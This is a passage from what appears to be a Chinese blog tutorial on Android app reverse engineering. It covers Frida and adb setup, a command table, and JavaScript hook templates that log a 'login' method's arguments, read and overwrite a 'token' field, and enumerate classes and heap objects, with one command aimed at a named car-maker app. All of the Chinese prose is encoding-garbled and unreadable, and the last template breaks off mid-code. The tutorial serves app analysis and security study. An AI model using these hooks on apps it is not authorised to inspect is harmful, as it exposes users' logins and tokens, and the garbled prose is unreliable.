<li><p>Detect It Easyï¼ˆDIEï¼‰ï¼šå¼€æºå…è´¹ï¼Œä¸”ä¸€ç›´æ›´æ–°ï¼Œå¯é€šè¿‡Microsoft Storeä¸‹è½½å®‰è£…ã€‚åŠŸèƒ½æ¯”è¾ƒå¼ºå¤§ï¼Œé‡Œé¢æ•´åˆäº†å¤šä¸ªå·¥å…·çš„åŠŸèƒ½ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251202211432654.png" alt="image-20251202211432654"></p>
</li>
<li><p>Virus Totalï¼šä¸“é—¨åˆ†ææ¶æ„ç¨‹åºçš„å¹³å°ï¼Œå¯ä»¥ç”¨æ¥åˆ†æapkï¼Œè§£æç›¸å…³ä¿¡æ¯ã€‚DIEå·¥å…·é‡Œé¢å°±å†…ç½®äº†è¿™ä¸ªå¹³å°</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251202212021068.png" alt="image-20251202212021068"></p>
</li>
</ol>
<h1 id="Fridaè°ƒè¯•"><a href="#Fridaè°ƒè¯•" class="headerlink" title="Fridaè°ƒè¯•"></a>Fridaè°ƒè¯•</h1><blockquote>
<p><a href="https://xiananren.github.io/2023/08/30/frida/index.html">fridaå¸¸è§ä½¿ç”¨åŠè„šæœ¬æ”¶é›† | Xman</a></p>
</blockquote>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ol>
<li><p>Androidï¼šå®‰è£…Frida-Serverï¼ˆå»ºè®®ä½¿ç”¨16.xç‰ˆæœ¬ï¼‰<a href="https://github.com/frida/frida/releases/download/16.5.9/frida-server-16.5.9-android-arm64.xz">https://github.com/frida/frida/releases/download/16.5.9/frida-server-16.5.9-android-arm64.xz</a></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb push frida-server /data/local/tmp/frida</span><br><span class="line">adb shell &quot;chmod <span class="number">777</span> /data/local/tmp/frida&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windowsï¼šå®‰è£…ä¸serverç‰ˆæœ¬å¯¹åº”çš„å®¢æˆ·ç«¯</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install frida~=<span class="number">16</span>.<span class="number">5</span>.<span class="number">9</span></span><br><span class="line">pip install frida-tools~=<span class="number">12</span>.<span class="number">3</span>.<span class="number">0</span></span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨frida-server</span></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">/data/local/tmp/frida</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä½¿ç”¨hook.jsè„šæœ¬hookå‰åˆ©é“¶æ²³ä¸­çš„æŸä¸ªå‡½æ•°</span></span><br><span class="line">frida -U -n &quot;å‰åˆ©é“¶æ²³&quot; -l ./hook.js</span><br></pre></td></tr></table></figure>

<h3 id="fridaå¸¸ç”¨å‘½ä»¤"><a href="#fridaå¸¸ç”¨å‘½ä»¤" class="headerlink" title="fridaå¸¸ç”¨å‘½ä»¤"></a>fridaå¸¸ç”¨å‘½ä»¤</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>adb forward tcp:27041 tcp:27042</td>
<td>å°†ç”µè„‘çš„tcp&#x2F;27041å’Œæ‰‹æœºçš„tcp&#x2F;27042å»ºç«‹è¿æ¥</td>
</tr>
<tr>
<td>adb devices</td>
<td>æŸ¥çœ‹å½“å‰è¿æ¥è®¾å¤‡</td>
</tr>
<tr>
<td>adb -s è®¾å¤‡å· å…¶ä»–æŒ‡ä»¤</td>
<td>å¤šä¸ªè®¾å¤‡æ—¶æŒ‡å®šè®¾å¤‡ï¼ˆadb -s FA6AE0309067 shellï¼‰</td>
</tr>
<tr>
<td>adb shell getprop ro.product.cpu.abi</td>
<td>æŸ¥çœ‹Androidå¤„ç†å™¨æ¶æ„</td>
</tr>
<tr>
<td>adb install xxx.apk</td>
<td>å®‰è£…APP</td>
</tr>
<tr>
<td>adb install -r xxx.apk</td>
<td>å®‰è£…APP,å·²ç»å­˜åœ¨,è¦†ç›–å®‰è£…</td>
</tr>
<tr>
<td>adb uninstall appåŒ…å</td>
<td>å¸è½½APP</td>
</tr>
<tr>
<td>adb uninstall -k appåŒ…å</td>
<td>å¸è½½APP,ä¿ç•™æ•°æ®</td>
</tr>
<tr>
<td>adb push æ–‡ä»¶å æ‰‹æœºè·¯å¾„</td>
<td>å¾€æ‰‹æœºä¼ é€’æ–‡ä»¶</td>
</tr>
<tr>
<td>adb pull æ‰‹æœºè·¯å¾„&#x2F;æ–‡ä»¶å</td>
<td>ä»æ‰‹æœºç«¯è·å–æ–‡ä»¶</td>
</tr>
<tr>
<td>adb logcat</td>
<td>æŸ¥çœ‹æ—¥å¿—</td>
</tr>
<tr>
<td>adb logcat -c</td>
<td>æ¸…æ—¥å¿—</td>
</tr>
<tr>
<td>adb shell pm list packages</td>
<td>åˆ—å‡ºæ‰‹æœºç«¯å®‰è£…çš„æ‰€æœ‰appåŒ…å</td>
</tr>
<tr>
<td>adb shell dumpsys window | findstr mCurrentFocus</td>
<td>æŸ¥çœ‹å½“å‰åŒ…åå’Œä¸»Activity</td>
</tr>
<tr>
<td>adb shell am start åŒ…å&#x2F;ä¸»Activity</td>
<td>å¯åŠ¨Activityï¼ˆadb shell am start com.autonavi.minimap&#x2F;com.autonavi.map.activity.NewMapActivityï¼‰</td>
</tr>
<tr>
<td>frida -U -f åŒ…å -l demo.js</td>
<td>-U&#x3D;USBè®¾å¤‡ï¼Œ-f&#x3D;spawnï¼ˆå†·å¯åŠ¨ï¼Œä¸»åŠ¨è¿è¡Œappï¼‰ï¼Œ-l&#x3D;hookè„šæœ¬ã€‚å¯ä»¥å†™åŒ…åï¼Œä¹Ÿå¯ä»¥å†™APPçš„åç§°</td>
</tr>
<tr>
<td>frida -U -n åŒ…å -l demo.js</td>
<td>-U&#x3D;USBè®¾å¤‡ï¼Œ-n&#x3D;spawnï¼ˆçƒ­å¯åŠ¨ï¼Œhookä»£ç æ³¨å…¥åˆ°å·²ç»å¯åŠ¨çš„appè¿›ç¨‹ä¸­ã€‚ç¼ºçœé€‰é¡¹ï¼Œå¯ä¸å†™ï¼‰</td>
</tr>
<tr>
<td>frida-ps -U</td>
<td>åˆ—ä¸¾å‡ºæ¥è®¾å¤‡ä¸Šçš„æ‰€æœ‰è¿›ç¨‹</td>
</tr>
<tr>
<td>frida-ls-devices</td>
<td>åˆ—ä¸¾å‡ºæ¥æ‰€æœ‰è¿æ¥åˆ°ç”µè„‘ä¸Šçš„è®¾å¤‡</td>
</tr>
<tr>
<td>frida-ps -Uai</td>
<td>åˆ—ä¸¾å‡ºæ¥è®¾å¤‡ä¸Šçš„æ‰€æœ‰å·²å®‰è£…åº”ç”¨ç¨‹åºå’Œå¯¹åº”çš„åå­—</td>
</tr>
<tr>
<td>frida-trace -U -f Name -i â€œå‡½æ•°åâ€</td>
<td>è·Ÿè¸ªæŸä¸ªå‡½æ•°ï¼ˆfrida-trace -U -f com.autonavi.minimap -i â€œgetRequestParamsâ€ï¼‰</td>
</tr>
</tbody></table>
<h3 id="hookæ¨¡æ¿"><a href="#hookæ¨¡æ¿" class="headerlink" title="hookæ¨¡æ¿"></a>hookæ¨¡æ¿</h3><h4 id="æ™®é€šæ–¹æ³•"><a href="#æ™®é€šæ–¹æ³•" class="headerlink" title="æ™®é€šæ–¹æ³•"></a>æ™®é€šæ–¹æ³•</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PKG</span>   = <span class="string">&quot;com.example.target&quot;</span>;  <span class="comment">//åŒ…å</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLS</span>   = <span class="string">&quot;com.example.target.UserManager&quot;</span>;  <span class="comment">//ç±»å</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">METHOD</span>= <span class="string">&quot;login&quot;</span>;          <span class="comment">//åªæœ‰1ä¸ªç­¾åçš„æ™®é€šæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLS</span>);</span><br><span class="line">    clazz[<span class="variable constant_">METHOD</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa, pb</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==========  Frida Enter  ==========&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°1ï¼š&quot;</span>+pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°2ï¼š&quot;</span>+pb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* æ‰“å°è°ƒç”¨é“¾ */</span></span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>;i&lt;stack.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">const</span> cls = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> mtd = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file= stack[i].<span class="title function_">getFileName</span>()||<span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line= stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;cls&#125;</span>.<span class="subst">$&#123;mtd&#125;</span>(<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ret = <span class="variable language_">this</span>[<span class="variable constant_">METHOD</span>](pa, pb);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¿”å›ï¼š&quot;</span>+ret);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========  Frida Leave  ===========\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PKG</span>   = <span class="string">&quot;com.example.target&quot;</span>;  <span class="comment">//åŒ…å</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLS</span>   = <span class="string">&quot;com.example.target.UserManager&quot;</span>;  <span class="comment">//ç±»å</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">METHOD</span>= <span class="string">&quot;staticLogin&quot;</span>;    <span class="comment">//staticæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLS</span>);</span><br><span class="line">    clazz[<span class="variable constant_">METHOD</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa, pb</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==========  Frida Enter (static)  ==========&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°1ï¼š&quot;</span>+pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°2ï¼š&quot;</span>+pb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>;i&lt;stack.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">const</span> cls = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> mtd = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file= stack[i].<span class="title function_">getFileName</span>()||<span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line= stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;cls&#125;</span>.<span class="subst">$&#123;mtd&#125;</span>(<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ret = <span class="variable language_">this</span>[<span class="variable constant_">METHOD</span>](pa, pb);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;è¿”å›ï¼š&quot;</span>+ret);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========  Frida Leave  ===========\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PKG</span>   = <span class="string">&quot;com.example.target&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLS</span>   = <span class="string">&quot;com.example.target.UserManager&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">METHOD</span>= <span class="string">&quot;$init&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLS</span>);</span><br><span class="line">    clazz[<span class="variable constant_">METHOD</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">pa, pb</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==========  Frida Enter  &lt;$init&gt;  ==========&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°1ï¼š&quot;</span>+pa);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å‚æ•°2ï¼š&quot;</span>+pb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>;i&lt;stack.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">const</span> cls = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> mtd = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file= stack[i].<span class="title function_">getFileName</span>()||<span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line= stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;cls&#125;</span>.<span class="subst">$&#123;mtd&#125;</span>(<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ret = <span class="variable language_">this</span>[<span class="variable constant_">METHOD</span>](pa, pb);   <span class="comment">// æ„é€ æ–¹æ³•è¿”å› this</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ„é€ å®Œæˆ&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========  Frida Leave  ===========\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="è¯»å–å­—æ®µ"><a href="#è¯»å–å­—æ®µ" class="headerlink" title="è¯»å–å­—æ®µ"></a>è¯»å–å­—æ®µ</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PKG</span>   = <span class="string">&quot;com.example.target&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLS</span>   = <span class="string">&quot;com.example.target.UserManager&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FIELD</span> = <span class="string">&quot;token&quot;</span>;          <span class="comment">// å­—æ®µå</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLS</span>);</span><br><span class="line">    clazz[<span class="variable constant_">FIELD</span>].<span class="property">getter</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==========  Frida Field Read  ==========&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> val = <span class="variable language_">this</span>[<span class="variable constant_">FIELD</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å­—æ®µå€¼ï¼š&quot;</span>+val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>;i&lt;stack.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">const</span> cls = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> mtd = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file= stack[i].<span class="title function_">getFileName</span>()||<span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line= stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;cls&#125;</span>.<span class="subst">$&#123;mtd&#125;</span>(<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========  Frida Leave  ===========\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹å­—æ®µ"><a href="#ä¿®æ”¹å­—æ®µ" class="headerlink" title="ä¿®æ”¹å­—æ®µ"></a>ä¿®æ”¹å­—æ®µ</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PKG</span>   = <span class="string">&quot;com.example.target&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLS</span>   = <span class="string">&quot;com.example.target.UserManager&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FIELD</span> = <span class="string">&quot;token&quot;</span>;  <span class="comment">//å­—æ®µå</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLS</span>);</span><br><span class="line">    clazz[<span class="variable constant_">FIELD</span>].<span class="property">setter</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">newVal</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n==========  Frida Field Write  ==========&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åŸå€¼å°†è¢«è¦†ç›–ä¸ºï¼š&quot;</span>+newVal);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> thread = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Thread&quot;</span>).<span class="title function_">currentThread</span>();</span><br><span class="line">        <span class="keyword">const</span> stack = thread.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>;i&lt;stack.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">const</span> cls = stack[i].<span class="title function_">getClassName</span>();</span><br><span class="line">            <span class="keyword">const</span> mtd = stack[i].<span class="title function_">getMethodName</span>();</span><br><span class="line">            <span class="keyword">const</span> file= stack[i].<span class="title function_">getFileName</span>()||<span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> line= stack[i].<span class="title function_">getLineNumber</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;i&#125;</span>: <span class="subst">$&#123;cls&#125;</span>.<span class="subst">$&#123;mtd&#125;</span>(<span class="subst">$&#123;file&#125;</span>:<span class="subst">$&#123;line&#125;</span>)è°ƒç”¨äº†â†‘`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable constant_">FIELD</span>].<span class="property">value</span> = newVal;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========  Frida Leave  ===========\n&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="æšä¸¾æ‰€æœ‰ç±»çš„ä¿¡æ¯"><a href="#æšä¸¾æ‰€æœ‰ç±»çš„ä¿¡æ¯" class="headerlink" title="æšä¸¾æ‰€æœ‰ç±»çš„ä¿¡æ¯"></a>æšä¸¾æ‰€æœ‰ç±»çš„ä¿¡æ¯</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;n[*] enumerating classes...&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">_className</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] found instance of &#x27;&quot;</span>+_className+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="æšä¸¾ç±»åŠ è½½å™¨"><a href="#æšä¸¾ç±»åŠ è½½å™¨" class="headerlink" title="æšä¸¾ç±»åŠ è½½å™¨"></a>æšä¸¾ç±»åŠ è½½å™¨</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="property">available</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//æšä¸¾å½“å‰åŠ è½½çš„Java VMç±»åŠ è½½å™¨</span></span><br><span class="line">      <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">          <span class="comment">//å›è°ƒå‡½æ•°ï¼Œå‚æ•°loaderæ˜¯ç±»åŠ è½½çš„ä¿¡æ¯</span></span><br><span class="line">          <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>,loader);</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="comment">//æšä¸¾å®Œæ¯•æ‰€æœ‰ç±»åŠ è½½å™¨ä¹‹åçš„å›è°ƒå‡½æ•°</span></span><br><span class="line">          <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; END &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥æ‰¾å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡"><a href="#æŸ¥æ‰¾å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="æŸ¥æ‰¾å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡"></a>æŸ¥æ‰¾å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//æŸ¥æ‰¾android.view.Viewç±»åœ¨å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View&quot;</span>, &#123;</span><br><span class="line">        <span class="comment">//æšä¸¾æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span class="comment">//æ‰“å°å®ä¾‹</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(instance);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//æšä¸¾å®Œæˆåè°ƒç”¨</span></span><br><span class="line">        